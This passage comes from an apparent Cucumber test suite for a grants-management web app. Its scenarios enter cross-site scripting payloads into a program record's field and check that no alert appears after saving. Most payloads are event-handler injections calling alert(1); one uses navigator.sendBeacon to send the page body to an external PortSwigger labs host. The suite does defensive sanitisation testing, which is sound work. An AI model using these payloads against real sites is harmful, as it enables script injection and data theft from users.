    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                       | Field                  |
      | <div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302060 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                             | Field                  |
      | <xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302062 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                           | Field                  |
      | <video onfullscreenchange=alert(1) src=validvideo.mp4 controls> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302064 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                              | Field                  |
      | <input oninput=alert(1) value=xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302066 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                        | Field                  |
      | <form><input oninvalid=alert(1) required><input type=submit> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302067 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                    | Field                  |
      | <xss onkeydown="alert(1)" contenteditable style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302068 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                     | Field                  |
      | <xss onkeypress="alert(1)" contenteditable style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302069 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                  | Field                  |
      | <xss onkeyup="alert(1)" contenteditable style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302070 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                      | Field                  |
      | <xss onmousedown="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302071 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                       | Field                  |
      | <xss onmouseenter="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302074 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                       | Field                  |
      | <xss onmouseleave="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302075 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                      | Field                  |
      | <xss onmousemove="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302077 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                     | Field                  |
      | <xss onmouseout="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302079 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                    | Field                  |
      | <xss onmouseup="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302078 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                      | Field                  |
      | <xss onmouseover="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302080 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                             | Field                  |
      | <xss onmousewheel=alert(1) style=display:block>requires scrolling | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302081 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                              | Field                  |
      | <video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302082 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                 | Field                  |
      | <body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302083 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                          | Field                  |
      | <a onpaste="alert(1)" contenteditable>test</a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302084 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                            | Field                  |
      | <audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302085 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                     | Field                  |
      | <xss onpointerdown=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302086 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
